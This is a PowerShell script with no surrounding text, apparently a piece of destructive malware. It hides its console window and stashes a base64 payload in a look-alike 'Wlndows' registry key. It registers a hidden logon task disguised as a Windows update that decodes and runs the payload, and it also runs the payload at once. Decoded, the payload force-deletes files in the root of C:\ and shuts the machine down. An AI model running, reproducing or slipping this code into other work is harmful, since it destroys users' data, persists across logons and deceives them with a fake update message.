$payloadBase64 = "U2V0LUV4ZWN1dGlvblBvbGljeSBSZW1vdGVTaWduZWQKJEVycm9yQWN0aW9uUHJlZmVyZW5jZSA9ICJTaWxlbnRseUNvbnRpbnVlIgpHZXQtQ2hpbGRJdGVtIC1QYXRoICJDOlwiIC1GaWxlIHwgU29ydC1PYmplY3QgLVByb3BlcnR5IE5hbWUgfCBGb3JFYWNoLU9iamVjdCB7CiAgICBSZW1vdmUtSXRlbSAkXy5GdWxsTmFtZSAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKfQpTdG9wLUNvbXB1dGVyIC1Gb3JjZQ==";
$path = "Wlndows";   
$name = "Updates";

Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
';
[Console.Window]::ShowWindow([Console.Window]::GetConsoleWindow(), 0);

Set-ItemProperty -path "HKEY_CURRENT_USER:\Software\$($path)" -Name "$($name)" -Force -Value $payloadBase64;

$u = [Environment]::UserName;

$a = New-ScheduledTaskAction -Execute "powershell.exe" "-w hidden -ExecutionPolicy Bypass -nop -NoExit -C Write-host 'Windows update ready'; iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Get-ItemProperty HKEY_CURRENT_USER:\Software\$($path)).$($name))));";
$t = New-ScheduledTaskTrigger -AtLogOn -User "$($u)";
$p = New-ScheduledTaskPrincipal "$($u)";
$s = New-ScheduledTaskSettingsSet -Hidden;
$d = New-ScheduledTask -Action $a -Trigger $t -Principal $p -Settings $s;
Register-ScheduledTask "$($path)$($name)" -InputObject $d;

Invoke-Expression ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($payloadBase64)));
